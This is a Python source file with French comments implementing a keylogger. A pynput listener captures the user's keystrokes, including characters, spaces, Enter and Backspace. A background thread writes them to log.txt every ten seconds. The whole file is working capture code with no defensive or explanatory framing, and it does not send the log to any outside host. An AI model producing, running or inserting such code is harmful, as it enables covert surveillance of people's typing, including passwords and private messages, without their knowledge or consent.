from pynput import keyboard
import os
import threading
import time

# Variables globales
log = ""
path = os.path.join(os.getcwd(), "log.txt")

def report():
    global log, path
    while True:  # Boucle infinie
        if log:  # Si le log n'est pas vide
            with open(path, "a") as logfile:
                logfile.write(log)
            log = ""  # Réinitialiser le log après l'écriture
        time.sleep(10)  # Attendre 10 secondes avant la prochaine écriture

def processkeys(key):
    global log
    
    try:
        # Gestion des caractères normaux
        if hasattr(key, 'char'):
            log += key.char
        # Gestion des touches spéciales
        elif key == keyboard.Key.space:
            log += ' '
        elif key == keyboard.Key.enter:
            log += '\n'
        elif key == keyboard.Key.backspace:
            log = log[:-1]
        
    except AttributeError:
        # Ignorer les autres touches spéciales
        pass

# Démarrer le thread de rapport en arrière-plan
report_thread = threading.Thread(target=report, daemon=True)
report_thread.start()

# Création et démarrage du listener
with keyboard.Listener(on_press=processkeys) as keyboard_listener:
    keyboard_listener.join()